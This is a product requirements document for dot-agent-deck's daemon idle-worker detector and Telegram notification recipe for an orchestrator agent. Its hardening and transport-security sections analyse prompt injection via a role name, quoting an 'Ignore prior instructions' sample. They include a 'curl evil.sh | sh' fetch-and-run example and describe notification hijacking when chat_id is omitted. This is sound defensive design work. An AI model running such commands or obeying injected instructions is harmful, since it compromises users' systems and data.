# PRD #126: Agent-driven notifications + idle-worker detection

**Status**: In progress — **rescoped 2026-07-27 from a no-code dogfood into a real, shipped feature** (see [Scope decision (2026-07-27, rescope to a real feature)](#scope-decision-2026-07-27-rescope-to-a-real-feature)). Phase 1 dogfood (config-only) completed and informed this rescope; its results are preserved in [Background](#background-the-dogfood-that-led-here). M1 (detector + hardening + tests), M2 (recipe), M3 (docs) and M4 (dogfood retirement) all landed 2026-07-28, and `main` was merged in the same day — including PRD #140, whose routing-identity change required real rework of this PRD's identity binding and config resolution (see [PRD #140 integration record](#prd-140-integration-record--the-main-merge-2026-07-28-merge-commit-4e61423)). Fast tier **1252/1252**, scoped e2e **15/15**. Outstanding before merge: the rule-12 cross-version check (M1.5), the full e2e gate with recording, `/prd-done`, and the demo reel. M5 (validate on real runs) is post-merge and additionally blocked on `TELEGRAM_CHAT_ID` being provisioned.
**Priority**: Medium
**Created**: 2026-05-25
**GitHub Issue**: [#126](https://github.com/vfarcic/dot-agent-deck/issues/126)
**Closes**: [#99](https://github.com/vfarcic/dot-agent-deck/issues/99) (supersedes prior orchestrator-only `Notifier` design)
**Related**: PRD #8 (terminal bell), PRD #20 (multi-agent), PRD #82 (orchestrator role reinforcement — see [Interaction with PRD #82](#interaction-with-prd-82)), PRD #140 (concurrent-orchestration routing identity — this PRD's identity binding and config resolution were reworked onto it, see [PRD #140 integration record](#prd-140-integration-record--the-main-merge-2026-07-28-merge-commit-4e61423)), PRD #201 (Pi integration)

## Scope decision (2026-07-27, rescope to a real feature)

This PRD began as a **no-code dogfood** — wire agent notifications for this repo's own development with zero deck code, and let the experience decide whether the deck should be extended. That dogfood ran (config-only, ntfy over `curl`) and did its job: it confirmed the human-gate notifications can be driven from the orchestrator prompt, and it surfaced — immediately and concretely — the **one thing config alone cannot do: detect a worker that was delegated to and then went silent.** An LLM orchestrator, once it delegates and waits, gets no execution turns until the worker responds, so it cannot wake itself to notice a stuck/dead worker. That needs a wall-clock timer, which only the daemon can own.

The maintainer decided to **build that as a real, shipped product feature** (not a dev-only crutch), because it is generally useful to any orchestration, and because this release already carries other compatibility-affecting features. This PRD is therefore rescoped from "dogfood, no deck code" to:

1. **A daemon-side idle-worker detector** — an *agnostic* capability: the daemon tracks each outstanding delegation and, after a configurable timeout with no response, **injects a self-describing prompt into the orchestrator**. The daemon does **not** send notifications; it reports the fact, and the orchestrator decides what to do (notify, re-delegate, abandon, surface in the TUI). This is the deferred "inactivity nudge" from #99/#126, done as a neutral primitive rather than a notifier.
2. **A notification recipe** — orchestrator-only Telegram messages (via MCP), fired at the workflow's pause-for-human moments *and* on the daemon's idle-worker event.
3. **Published user documentation** — one `docs/` page that (a) documents the idle-worker feature and its config knob and (b) shows an *example* recipe wiring those moments to a chat channel (Telegram as the worked example).
4. **Retiring the dogfood artifacts** — remove the ntfy `scripts/notify.sh` glue and its per-role prompt instructions, replaced by the productized design above.

### Decisions locked in this rescope

- **Idle detection lives in the daemon**, exposed as an agnostic event (orchestrator decides the action) — not a notification feature baked into the daemon.
- **Timeout is configurable** via a new key in `.dot-agent-deck.toml`, **default 120 minutes**. A rare false positive on a legitimately long task is an acceptable, discardable notification; v1 fires on **elapsed time since delegation**, not on a liveness/activity signal (that refinement is a later improvement if false positives prove annoying).
- **Non-breaking is the target.** The idle prompt is delivered over the **existing prompt/input-injection path** (the same mechanism the scheduler and delegation already use to put text into a session), so **no new wire message type is introduced** and an older TUI simply never receives idle prompts. Rule 12's cross-version manual test is the arbiter; classified as a **feature** (non-breaking) unless implementation forces otherwise.
- **Notifications are orchestrator-only.** The orchestrator is the only agent the user talks to and the only one that ever waits on the user. Workers never notify and never block on the user — a blocked/needs-input worker returns the question via `work-done`, and the orchestrator escalates. The per-worker `blocked` pings from the dogfood are **removed**.
- **No experimental flag** (rule 9 answered "no") — the feature ships visible by default.
- **User-facing docs** go in published `docs/` + `site/sidebars.js` (rule 11), not `docs/develop/`.
- **Messages are short** and identify the orchestration (repo + PRD #), because the maintainer runs several in parallel — each message must say only *done* vs *needs attention* and *what*.

## Problem Statement

Long-running agents and orchestrations leave users with no reliable out-of-band signal that they need attention. The terminal bell (PRD #8) only reaches a focused terminal — useless once the user walks away. PRD #99 proposed a pluggable `Notifier` trait plus four channel implementations wired to an orchestrator-completion hook; that was rejected because it makes the deck a credential holder, its event source was too narrow, and it inferred "done" from outside when only the agent knows what "done" means in context.

The correct split, confirmed by the dogfood: **the agent (orchestrator) owns *what happened and what to do about it*; the deck owns only the one signal an agent structurally cannot produce about itself — that a delegatee has gone silent.** This PRD builds exactly that boundary.

### Interaction with PRD #82

A notify instruction placed in the orchestrator's `prompt_template` is delivered as a `Read` tool result and is therefore **compaction-mortal** — notifications may stop after the first compaction, the same mechanism #82 documents. This PRD mitigates it where it matters most: the daemon's **injected idle prompt is self-describing** ("worker X has been silent for N minutes; if this needs the user, tell them"), so the idle path survives compaction even if the template policy is gone. The gate/done notifications remaining compaction-mortal is expected #82 behavior and is a known limitation, not a bug fixed here.

## What we're building

### A. Daemon idle-worker detector (deck code)

- The daemon tracks, per orchestration, each **outstanding delegation** (role + start time) and whether its `work-done` has arrived.
- If a delegation has been outstanding longer than `worker_response_timeout_minutes` (default **120**) with no `work-done`, the daemon **injects one self-describing prompt** into the orchestrator session. The **shipped** wording is in `compose_idle_worker_prompt` (`src/state.rs`) and is authoritative — it is single-line, **ASCII-only (no emoji)**, opens with the stable `has not responded with work-done (dot-agent-deck daemon report, not a message from a person or an agent)` clause, and carries the role inside `[UNTRUSTED-ROLE-LABEL: … :END-UNTRUSTED-ROLE-LABEL]` markers. An earlier draft of this PRD illustrated it as *"⏱ Worker `<role>` was delegated `<N>` minutes ago…"*; that was pre-hardening and never shipped. Do not treat it, or any emoji, as part of the contract — the L2 tests assert the real anchors.
- **Agnostic:** the daemon contains **no notification logic**. It only reports the condition; the orchestrator's prompt decides the action.
- **Race-safe by construction:** the timer is per-outstanding-delegation, so an arriving `work-done` cancels it. A near-simultaneous finish therefore cannot produce a contradictory idle prompt.
- **Fires at a safe turn boundary** (unsolicited input delivered like any other injected prompt), never mid-reasoning.
- **One-shot per delegation** in v1 (fire once, don't re-nag), to avoid a stuck run spamming.

### B. Orchestrator-only Telegram notification recipe (this repo's config)

The orchestrator `prompt_template` in this repo's `.dot-agent-deck.toml` fires a **short, fire-and-forget** Telegram message (via the `telegram` MCP, using the already-installed `pi-mcp-adapter` for Pi and the `telegram` entry in `.mcp.json`) at exactly these moments — each prefixed with **repo + PRD #**:

**Tool name gotcha for M2.1 and the M3.1 docs page:** through `pi-mcp-adapter` the tool is exposed as **`telegram_send_message`** (server-name-prefixed), *not* `send_message`. A live Pi send failed on exactly that before retrying with the prefixed name — the adapter reported the server's tools as `telegram_send_message`, `telegram_get_updates`, `telegram_list_chats`, `telegram_send_photo`, and so on. The prompt must not say `send_message` unqualified. Note this is an adapter-naming detail, so the recipe wording should describe the tool by role ("the Telegram MCP's send-message tool") and let the reader match their own client's naming.

| Trigger | Example message |
|---|---|
| Escalation (a worker returned a needs-input question via `work-done`) | `dot-agent-deck PRD #N — needs input: <one line>` |
| Merge gate (step 7) | `dot-agent-deck PRD #N — needs go-ahead: merge PR #<pr>` |
| Full run done/abandoned (only when *fully* done) | `dot-agent-deck PRD #N — DONE: merged & closed` |
| Daemon idle-worker event | `dot-agent-deck PRD #N — STUCK: <role> silent >N min` |

Fire-and-forget throughout ("send and continue", never wait for ack). Per-worker `blocked` pings are removed.

#### Notify-moment decision (2026-07-28, maintainer's call): five triggers → four

The **test-plan gate was dropped** as a notify moment. It fires seconds into a run, while the maintainer is still sitting at the terminal watching the plan get written, and it is always answered immediately — so the message arrived after the thing it announced had already been handled. It was noise, and noise on this channel is expensive: it trains the recipient to ignore the three moments that do matter. Recorded here explicitly so a later reader does not mistake the missing row for an accidental omission and restore it.

The generalisation, which is the reusable part and is stated as the selection rule on the docs page: the criterion is **not "every pause for a human" but every pause where the human may have walked away.** A gate seconds into a run, with the operator still watching, earns nothing; a gate after a long unattended stretch earns a lot. Elapsed unattended time — not the gate's importance — is what decides.

**Accepted limitation of the removal, recorded honestly.** If the operator *does* walk away immediately after starting a run, a test plan waiting for approval now has **no** out-of-band signal, and the idle-worker detector cannot cover it either: at step 1 no delegation is outstanding yet, so there is nothing for it to time out. The run simply sits at the start until the operator returns to the terminal. Nothing is lost — the gate still holds and the plan still waits — but nothing tells you. This is the accepted cost of the decision, not an argument against it.

The four remaining moments are unchanged: escalation, merge gate, run fully finished/abandoned, and the daemon's idle-worker prompt.

### C. Published user documentation

One page under `docs/` (added to `site/sidebars.js`) with **two clearly separated parts**:

1. **Feature: idle-worker detection.** What it does (agnostic event), the `worker_response_timeout_minutes` knob and its default, and that the daemon reports — it does not itself notify.
2. **Example recipe: turn moments into messages.** A worked example wiring the orchestrator prompt to a chat channel, with **placeholders** (never the maintainer's real bot/chat), showing the Telegram MCP + `pi-mcp-adapter` setup as *one* channel while making clear the channel is the reader's choice. Framed as an example that works for us, not a guarantee.

### D. Retire the dogfood artifacts

Remove `scripts/notify.sh` and the per-role ntfy notify instructions from `.dot-agent-deck.toml`; discard the interrupted ntfy Greptile-fix edits; retire/convert `docs/develop/notifications-dogfood.md`. Reconcile PR #223 so it reflects the productized design end to end.

## Scope

### In scope

- Daemon idle-worker detector (A) + its `.dot-agent-deck.toml` config knob.
- Automated tests for the daemon feature (rule 4).
- Orchestrator-only Telegram recipe in this repo's config (B).
- Published user docs (C).
- Removal of ntfy dogfood artifacts (D).
- A minimal orchestrator-side expectation log kept for falsifiability (detect "reached a moment but did not send", e.g. after compaction). Lightweight; MCP's returned `message_id` already closes the "sent-but-never-arrived" gap.
- Changelog fragment (feature) and cross-version contract check (rule 12).

### Out of scope

- **The no-agent / dead-orchestrator fallback** (a pre-spawn scheduler failure or a crashed orchestrator, where there is nobody to inject into or notify). Accepted **known limitation**; notifications are best-effort, not guaranteed. Candidate for a follow-up.
- **Liveness/activity-based idle detection** (distinguishing "working but silent" from "hung"). v1 uses elapsed time with a long default; refine later only if false positives are annoying.
- **Per-role / per-task timeouts.** v1 is a single configurable value.
- **A pluggable `Notifier` trait, deck-side channels, deck-held credentials, or an agent-callable `notify` CLI.** The inversion of #99 stands — the deck reports idleness; the agent notifies.
- **Re-nagging / repeated idle prompts** for the same delegation (one-shot in v1).

## Success Criteria

- Delegating to a worker that never responds causes the daemon to inject exactly one self-describing idle prompt into the orchestrator after the configured timeout; a `work-done` arriving first cancels it (no false idle prompt). Covered by automated tests.
- `worker_response_timeout_minutes` in `.dot-agent-deck.toml` is honored (default 120).
- The change is **non-breaking**: a branch daemon interoperates with a previous-release TUI (and vice versa) — delegate and hooks still flow; an old TUI simply never receives idle prompts. Confirmed by the rule-12 cross-version manual test.
- This repo's orchestrator sends a Telegram message at each of the four selected moments — escalation, merge gate, run fully finished/abandoned, and the idle event — and nowhere else; messages are short and identify repo + PRD #. Workers send nothing. (Not *every* pause for a human: the test-plan gate is deliberately excluded per the [notify-moment decision](#notify-moment-decision-2026-07-28-maintainers-call-five-triggers--four).)
- The published docs page exists, separates the feature from the example recipe, uses placeholders, and is in `site/sidebars.js`.
- The ntfy artifacts are gone; `cargo test-fast` (and, pre-PR, `cargo test-e2e`) pass.
- A changelog **feature** fragment exists; version bump follows the release's policy.

## Design notes

### Delivery of the idle prompt (the key implementation question)

Before implementing, confirm two things in `src/daemon_protocol.rs` and the daemon: (1) there is an existing message that injects text/input into a *running* session (the scheduler's injected `prompt` and delegation task delivery both put text into a session — reuse that path), and (2) how the protocol handles unknown message variants. Reusing the existing injection path introduces **no new wire shape**, which is what keeps the feature non-breaking. Only if a genuinely new daemon→TUI event variant is unavoidable does the compatibility classification need revisiting.

### Fire-and-forget, orchestrator-only

The orchestrator is the sole notifier and the sole agent that waits on the user. Workers escalate via `work-done`; the orchestrator turns an unanswerable-without-the-user question into one notification and pauses. This removes the dogfood's per-worker `blocked` pings, which pinged the user about things they could not act on and risked a worker blocking on a reply that (by the topology) can never reach it.

## Milestones

### M1 — Daemon idle-worker detector

- [x] **M1.1** — Design verification (coder): confirm the reusable injection path and the protocol's unknown-variant handling; record the chosen approach and the non-breaking classification. → see [M1.1 record](#m11-record-design-verification-2026-07-28).
- [x] **M1.2** — Implement daemon tracking of outstanding delegations + one-shot, race-safe, self-describing idle-prompt injection after the timeout. → commit `d34fbd4`.
- [x] **M1.3** — `worker_response_timeout_minutes` config in `.dot-agent-deck.toml` (default 120), read by the daemon. → commit `d34fbd4`.
- [x] **M1.4** — Automated tests (rule 4): L2 synthetic (delegate → advance clock → idle prompt injected; `work-done` before timeout → no injection; config value honored) plus at least one PTY-attached L2 exercising the user-visible pane behavior. → `idle_worker_001`–`006` (fast) + PTY `011` stand-in (`d34fbd4`), the real-agent reel-marked `012` (`4685fb9`), and the post-hardening regression set `007`–`010`/`013` (`2fa4e81`). A follow-up audit of that regression set added the natural-exit `014`, strengthened `013`, and bound the `check_claude_available` expiry checks to their own tokens (`tests/real_agent_preflight.rs`). **Fast tier 1252/1252 post-merge (1173/1173 before it); scoped e2e 15/15.** Every regression test was proven capable of failing by disabling the guard it targets and restoring it (see the hardening record), including the four added when `main` was merged.
- [x] **M1.5** — Rule 12 cross-version manual test + a `changelog.d/126.feature.md` fragment. → Fragment `d10db23`. Cross-version test **run twice**: once pre-merge, then re-run on the post-merge tree because PRD #140 landed *after* `v0.34.1` was tagged and reworked the routing the matrix exercises — so the first verdict did not cover what ships. **Non-breaking confirmed both times, both directions.** The decisive observation: a delegate routed through #140's reworked `OrchestrationIdentity` path and the daemon's idle prompt appeared *verbatim in the old v0.34.1 TUI* as ordinary auto-submitted scrollback, proving no new wire shape. Caveat recorded for honesty: the deliberately-mixed pair only connects with the debug-only `DOT_AGENT_DECK_BUILD_ID_OVERRIDE` seam, because the **build-version handshake (PRD #161) is a separate and stricter gate than `PROTOCOL_VERSION`** and compiles out of release builds — so "non-breaking" is a statement about the protocol contract, not about mixing dev builds.

### M2 — Orchestrator-only Telegram recipe (this repo's config)

- [x] **M2.1** — Rewrite the orchestrator `prompt_template` to fire Telegram (the MCP's send-message tool, `telegram_send_message` under `pi-mcp-adapter`) on the four triggers above; short messages prefixed repo + PRD #; fire-and-forget. → `7b19356`, narrowed from five triggers to four by the [notify-moment decision](#notify-moment-decision-2026-07-28-maintainers-call-five-triggers--four) (the test-plan gate is no longer a notify moment; the template's step 1 now just posts the plan and stops, and it carries the walked-away selection rule so the row is not restored). The tool is described by role rather than hard-coded, and `chat_id` is **mandatory** with the reason stated (see the transport security record); reading `telegram_get_updates` is explicitly banned.
- [x] **M2.2** — Remove per-worker `blocked` pings; workers escalate via `work-done`. → `7b19356`; verified no `notify.sh`/ntfy reference survives in `.dot-agent-deck.toml`.
- [x] **M2.3** — Keep a minimal orchestrator-side expectation log for falsifiability. → `7b19356`: the orchestrator itself appends `timestamp | moment | message_id` (or `send=failed`/`send=skipped`) to the gitignored `.dot-agent-deck/notify-log.md`. No helper script exists any more.

**Recipient provisioning (resolved 2026-07-28).** `TELEGRAM_CHAT_ID` is now supplied the same way as the bot token — a `vals` reference to a GCP secret, `TELEGRAM_CHAT_ID: ref+gcpsecrets://vfarcic/telegram-key` in `.env.vals.yaml`, so the tracked file carries a **pointer rather than the id itself**. A plaintext value there would have followed the existing `SLACK_TEAM_ID`/`SLACK_CHANNEL_IDS` precedent but would also have published the maintainer's chat id in a public repo; the secret reference avoids that. `devbox.json` needed no change — its `init_hook` already runs `vals env -export -f .env.vals.yaml`, which exports every key in the file (verified: 11 → 12 exported vars).

Two operational notes worth keeping. The **chat id is a destination, not a credential** — it is useless without `TELEGRAM_BOT_TOKEN`, which is why a secret reference is prudence rather than necessity. And the recipe's **fail-safe on absence still matters**: if the variable is ever unset, the orchestrator must skip the send and log `send=skipped` rather than omit `chat_id`, because an omitted `chat_id` falls back to the most recently active chat and is interceptable by any sender (see the transport security record). Ordering discipline also matters when adding such a reference: the secret must exist and read back correctly **before** the `ref+gcpsecrets://` line is added, since a dangling reference makes `vals env` fail for every devbox shell and would take down every agent pane in a running orchestration.

### M3 — Published user docs

- [x] **M3.1** — New `docs/` page (in `site/sidebars.js`) separating the idle-worker feature from the example recipe; placeholders only; recipe framed as an example. → `74ba03e`: `docs/idle-workers-and-notifications.md`, originally a flat sidebar sibling at `sidebar_position` 5.6 between orchestration and scheduled-tasks. Placeholders verified — no real chat id or bot handle appears anywhere in tracked files. The test-only `DOT_AGENT_DECK_WORKER_RESPONSE_TIMEOUT_MS` seam is deliberately **not** documented, so a published page cannot invite production use of it. `npm ci && npm run build` in `site/` passes with no broken links. Same commit adds an explicit `worker_response_timeout_minutes = 120` above the first table header in this repo's own config, so the file-parsing path is exercised and correct placement is demonstrated by example.
- [x] **M3.2** — Scope + discoverability fixes on that page (2026-07-28, maintainer-directed). Three defects, in order of severity. **(a) The page never said it applies only to orchestrations.** It opened with "the daemon watches every outstanding delegation" and assumed the reader knew delegations exist only inside an orchestration; verified in code that the sole arm site is `handle_delegate` → `arm_idle_worker_watch_for_delegation` (`src/state.rs:1769`, inside `handle_delegate` at `src/state.rs:1693`), so a plain pane, a workspace mode, and a single-agent scheduled task can never produce an idle prompt, and Part 2 is orchestration-scoped too because the recipe lives in an orchestrator's `prompt_template`. Someone with a non-orchestration setup read the whole page before discovering none of it applied. A brief factual scope paragraph now closes the intro, above `## Part 1`. **(b) It was a flat sidebar sibling of Orchestration rather than a child.** `site/sidebars.js` now nests it under an `Orchestration` category (`link: { type: 'doc', id: 'orchestration' }`, `items: ['idle-workers-and-notifications']`), mirroring the existing `Remote Environments` pattern; the now-meaningless `sidebar_position: 5.6` is removed from the page frontmatter, since ordering comes from `items`. Nothing else referenced that position value (only the gitignored `site/.docusaurus/` build cache). **(c) Two cross-links were missing** — `docs/orchestration.md` never mentioned the feature (added: a pointer at the end of "How delegation works" plus a "See also" entry), and `docs/configuration.md` omitted `worker_response_timeout_minutes` entirely (added: a `### Top-Level Keys` table carrying the two things that bite — the above-the-first-table-header placement trap that `dot-agent-deck validate` cannot catch, and that `0` disables the detector rather than meaning "report immediately"). `npm ci && npm run build` re-verified: success, no broken links, and the generated sidebar shows the category with the page as its single child.

### M4 — Retire dogfood artifacts

- [x] **M4.1** — Remove `scripts/notify.sh` + ntfy prompt instructions; discard the interrupted Greptile-fix edits; retire/convert `docs/develop/notifications-dogfood.md`; reconcile PR #223. → `7b19356`: script deleted (its half-finished ntfy edits go with it), all ntfy instructions gone from every role, and the dogfood note rewritten as a short historical pointer so the `CONTRIBUTING.md` link stays live. **PR #223 reconciliation is still outstanding** — its title and body still describe the abandoned "Phase 1 dogfood (no deck code)" scope; that happens at `/prd-done`.

### M5 — Validate on real runs (post-merge)

- [ ] **M5.1** — Run a couple of real orchestrated PRDs, including one long enough to compact; confirm the gate/escalation/done notifications and the idle event fire as intended; record any refinements.

## M1.1 record — design verification (2026-07-28)

Verified against the code before implementing; this is what fixed the approach and the non-breaking classification.

**Delivery path (no new wire shape).** The idle prompt is injected via `AgentPtyRegistry::write_to_pane_and_submit(orchestrator_pane_id, text)` — already the exact primitive and target that `handle_work_done` uses to feed the orchestrator, and that the scheduler and delegation use elsewhere. The daemon calls the registry directly, so the bytes never become a protocol frame. The sibling `write_to_pane_notice` was rejected: it writes a visible-but-unsubmitted line, and we need the orchestrator to actually act.

**Non-breaking, `PROTOCOL_VERSION` stays 6.** Unknown-variant handling is a **hard error on every wire enum** — `AttachRequest` is `#[serde(tag = "op")]` with no `#[serde(other)]`, so an unknown op yields a malformed-request reply and a closed connection; `BroadcastMsg` is `#[serde(tag = "kind")]`, so an unknown kind kills the event stream (this is precisely why PRD #120 bumped 3→4). Only additive `#[serde(default, skip_serializing_if)]` struct fields are tolerated. The handshake is an **exact-match refusal**, so a needless bump would *itself* break interop. Because the idle prompt never crosses the wire, the cross-version matrix is better than this PRD originally assumed: a new daemon with an **old TUI still shows the idle prompt** (ordinary stream-out scrollback), and an old daemon with a new TUI simply has no detector. Classified **feature** → `changelog.d/126.feature.md`, patch bump. It would only become breaking if a `BroadcastMsg`/`KIND_*`/`AttachRequest` variant were added, or an existing field's meaning changed.

**Tracking, arming, cancelling.** Arm in `handle_delegate`'s target loop — it has the orchestrator pane id, target role, worker pane id and timestamp, and arming there (rather than inside dispatch) avoids clock skew from the `clear = true` SessionStart wait while still covering an early-bailing respawn failure. Cancel at the **very top** of `handle_work_done`, above all of its early returns. State lives on `AgentPtyRegistry` as interior-mutability side-maps (the established precedent), **not** on `AppState`: both handlers run under a read guard, and moving to `write()` would widen a hot lock.

**Three races, two of which this PRD had not identified.** (1) The finish-line race is handled for free by making the timer's first act on wake an **atomic take** under the registry mutex — work-done-first means the take returns `None` and the timer is a silent no-op, which also delivers one-shot behavior. (2) **Re-delegation to the same worker pane** overwrites the record, so delegation #1's still-sleeping timer would otherwise wake and consume delegation #2's record, firing a premature prompt — fixed with a monotonic **seq** in each record that each timer captures and the take checks conditionally. (3) A **deliberately closed worker pane** (`StopAgent` → `unregister_pane`) must also cancel, or closing a stuck worker still nags two hours later.

**Config.** `worker_response_timeout_minutes` on `ProjectConfig` with `#[serde(default)] = 120`. No `deny_unknown_fields` anywhere in `src/`, so adding the key is forward- and backward-compatible by construction. Resolution order is **env > file > default**, read from the *orchestration* cwd first and the worker cwd second (they diverge for PRD #120 issue-dispatch clones). **TOML gotcha that must be carried into the M3.1 docs page:** a top-level scalar key has to appear *above* the first table header — appending it to the end of a config whose tables start early silently makes it a key of the last table, where it is ignored.

**Test seam.** There is no injectable or virtual clock anywhere in `src/` or `tests/`, and a multi-thread tokio test with real PTYs could not use one anyway. The established pattern is an env override read at use time, so the detector reads `DOT_AGENT_DECK_WORKER_RESPONSE_TIMEOUT_MS` (milliseconds), letting tests run in ~1–2s. Observation works by making the orchestrator pane a `cat` stub that echoes injected bytes into the snapshot.

**Known limitation.** A daemon **restart** loses all in-memory outstanding records and silently disarms every pending timer. Worth stating on the docs page.

## Orchestration finding — the Codex tester cannot commit in a worktree

Recorded because it cost two delegation round-trips on this PRD and will recur on every worktree run until it is addressed.

The `tester` role runs Codex with `--sandbox workspace-write`. In a **git worktree**, `.git` is a *file* pointing at `<parent-repo>/.git/worktrees/<name>/`, so the real index lives **outside** the sandbox's writable root. Every `git add`/`commit` therefore fails, and Codex surfaces it as a "read-only index" — which reads like a permissions bug but is not: the index file is mode `rw-rw-r--` and owned by the user, and the orchestrator can commit the very same files without issue. The same role would commit fine in a plain branch checkout, where `.git` sits inside the workspace.

Consequences and the workaround used here: the tester's files must be committed by someone outside the sandbox. Having the **coder** stage them (the earlier approach) works but puts the tester's tests in reach of the role explicitly forbidden from editing them, so the safer route is for the **orchestrator** to commit them directly after verifying `cargo fmt --check` and `cargo clippy --all-targets -- -D warnings` itself, since rule 2 binds whoever commits.

Real fixes, in preference order: grant the tester's sandbox write access to the parent repo's `.git/worktrees/` path; or run the tester unsandboxed for worktree PRDs; or stop using worktrees for runs that involve the Codex tester. This belongs in `CLAUDE.md` or `docs/develop/` once a fix is chosen — it is a standing property of the role configuration, not a fact about this PRD.

## M1 hardening record — review + audit resolution (2026-07-28)

A reviewer and a security auditor examined `d34fbd4`/`4685fb9` and filed eight and five findings respectively (`.dot-agent-deck/review-findings-126-m1.md`, `.dot-agent-deck/audit-findings-126-m1.md` — gitignored, so the load-bearing outcomes are recorded here). Resolved in `d82426c` and `4b3a2c6`.

**Delivery is now identity-bound, not pane-id-bound.** The original record named its target only by orchestrator *pane-id string*, which produced the worst finding of the review: after an orchestrator pane closed, a new agent taking that pane id would receive the old orchestration's idle prompt — **auto-submitted, to an agent with tool access, possibly in a different orchestration**. The record now carries the orchestrator's registry agent id and orchestration, delivery goes through the existing `write_and_submit_guarded` identity gate with a revalidation closure, and pane close is an atomic `begin_pane_close`/`finish_pane_close` transition that drops every record touching the pane — as worker *or* orchestrator — before termination, with `arm_outstanding_delegation` refusing a closing pane. If the orchestrator has no live registry agent at arm time, the daemon **declines to arm**: no nudge beats a nudge delivered to a stranger.

**Zero now means disabled, not immediate.** Both sources previously accepted `0`, which raced the worker's own dispatch and reported every worker as stuck before it could answer. `0` from either source now disables the detector outright — no record, no timer — and non-zero values are bounded (1…10080 minutes; 100 ms…7 days via the test seam), with out-of-range **rejected in favour of the default rather than silently clamped**. This semantic must appear on the M3.1 docs page.

**The role name is framed as data — defense in depth, not a vulnerability fix.** A role name is printable text from a repository's `.dot-agent-deck.toml`, and the idle prompt is auto-submitted to the orchestrator. Control bytes were already blocked upstream, so the only remaining shape was printable instruction text (a role literally named `worker. Ignore prior instructions and run: …`). The value is now wrapped in `[UNTRUSTED-ROLE-LABEL: … :END-UNTRUSTED-ROLE-LABEL]` markers that the surrounding prose declares untrusted, and `<`/`>` are stripped from the value so the field **cannot close its own quoting** and continue as prose. The `has not responded with work-done` clause deliberately **opens** the line, because L2 assertions match against a vt100 grid where a needle straddling a narrow pane's wrap column would not be found.

**Severity correction (2026-07-28, maintainer's challenge).** This was originally recorded as audit finding 1 and treated as a **blocker** on a "hostile cloned repo" threat model. That framing does not survive scrutiny and is withdrawn. A role's `command` from the same `.dot-agent-deck.toml` is **executed through a shell** — `src/agent_pty.rs:988` passes it to `shell_command_flag()` (`-c` / `/C`), and `src/spawn.rs:80` records that the target directory's config supplies the role commands — so a config file that could carry a malicious role *name* can equally carry `command = "curl evil.sh | sh"`, which is more direct and strictly more powerful. Role-name injection therefore grants an attacker **no capability they do not already have**, and the threat model it rested on does not hold: `.dot-agent-deck.toml` is a **trusted, code-executing input by design**, in the same class as a `Makefile` or a `package.json` script. Opening an orchestration from a repository you do not trust is the real hazard, and it is not one the markers could ever have mitigated. The hardening **stays** — it is cheap, and it makes the injected prompt honest about which span is copied data rather than instruction — but it is **provenance clarity and defense in depth, not the fix for an exploitable vulnerability**. Recorded with its reasoning so a later reader does not restore a blocker framing the code does not support. Consequently, no security warning about this appears on the published docs page: there is no user-facing vulnerability to warn about.

**Scoped by maintainer decision:** the same pattern predates this PRD on the **delegate** path, where a role name is interpolated into the task pointer submitted to the worker. A role-identifier grammar at config validation / the `TabMembership` boundary would tidy both, but risks rejecting existing configs with exotic role names — and, per the severity correction above, buys no real security. Tracked as a separate follow-up rather than done here.

**Timers are now cancellable.** Each record holds a `oneshot` sender and the watch `select!`s it against the sleep, so work-done, supersession, or close wakes the task immediately instead of leaving it asleep for the full timeout holding an `Arc` — previously unbounded in live task count and reachable by repeated `delegate` calls. Duplicate target roles within one delegate signal are also de-duplicated.

### Transport security record — `telegram-mcp-bot@1.1.0` (2026-07-28)

The notification transport was source-reviewed because it holds the bot token and, like every stdio MCP server declared in `.mcp.json`, is spawned with the **full parent environment** — so it sees every secret in the shell. Reviewed artifact: `telegram-mcp-bot-1.1.0.tgz`, npm SRI `sha512-9c2ADQsc29JpyY1knd6tae678UNoNJkt6s5NvZJmuTXZa9wclCimoa0/XLf6ibbPx8n0TOFlqOcdMIZVr5QTig==`. The published `dist/` tree was **reproduced exactly** from a local build of commit `31c745d`, and npm carries a Sigstore/SLSA provenance attestation binding that tarball to the repo's release workflow and tag.

**Package-authored code is clean:** no `fetch`/socket/telemetry/beacon of its own, no non-documentation HTTP URL, all network traffic via grammY to `api.telegram.org`; it reads only `TELEGRAM_BOT_TOKEN` plus documented options and `HOME` for `~`-expansion of a caller-supplied photo path, never enumerating `process.env` nor logging or returning the token; no `eval`/`new Function`/`vm`/dynamic import; no consumer install hooks. `npm audit --omit=dev` on the freshly resolved graph: **0 advisories at every severity**. Weak maturity signals (single maintainer, young repo, unsigned tag) are counterbalanced by the reproducible build plus provenance.

Two findings shaped the recipe and must survive into the M3.1 docs page:

- **The bot has no allowed-user or allowed-chat check (high).** Every inbound message updates that chat's `lastMessageAt`, and both send tools fall back to the **most recently active chat** when `chat_id` is omitted. Anyone who learns the bot username can therefore message it just before a notification and receive that notification instead. Mitigation adopted: **always pass an explicit configured `chat_id`**, never rely on the default. Relatedly, `get_updates` is an unauthenticated inbound channel and thus a prompt-injection path, so the orchestrator is instructed never to read it. Server-side enforcement would require a fork, a patch, or a different server — `1.1.0` exposes no allowlist option.
- **An exact top-level pin does not pin the dependency graph.** `telegram-mcp-bot@1.1.0` declares `@modelcontextprotocol/sdk ^1.29.0`, `grammy ^1.41.1`, `zod ^4.3.6` and ships no shrinkwrap, so `npx -y telegram-mcp-bot@1.1.0` still resolves mutable, unreviewed transitives that execute in-process with the inherited environment (~102 production entries, none declaring install scripts at review time). Fully closing this needs a repo-managed install with a committed lockfile invoked via `npm ci --omit=dev --ignore-scripts`. **Deferred by maintainer decision**, because `.mcp.json` already runs `coderabbitai-mcp@latest` and `@modelcontextprotocol/server-slack` the same way: it is a pre-existing repo-wide pattern, not something this PRD introduced, and fixing it properly touches all three servers. The top-level pin is applied here as a strict improvement.

### Verification record — the regression tests were proven capable of failing

Because the hardening's two blockers were fixed on the strength of an argument, each regression test was validated by disabling the specific guard it targets, observing the failure, and restoring the guard (`2fa4e81`). This matters more than usual here: the tester pane had stopped consuming delegations, so by maintainer decision the tests were written by the same role that wrote the implementation, and a demonstrated failure is the only thing separating real coverage from a test that agrees with its author. (That delivery failure is now explained and fixed on `main` — see [the Codex `tester` delivery failure](#the-codex-tester-delivery-failure-is-explained-by-c9db4f1-237225).)

- `idle_worker_009` (SIGTERM grace overlap) — suppressing `begin_pane_close` reproduced the nudge inside the grace window; the test also asserts the overlap itself occurred, so it cannot pass for the wrong reason.
- `idle_worker_010` (close-vs-delegate barrier) — removing the `closing_panes` check in `arm_outstanding_delegation` alone fails it.
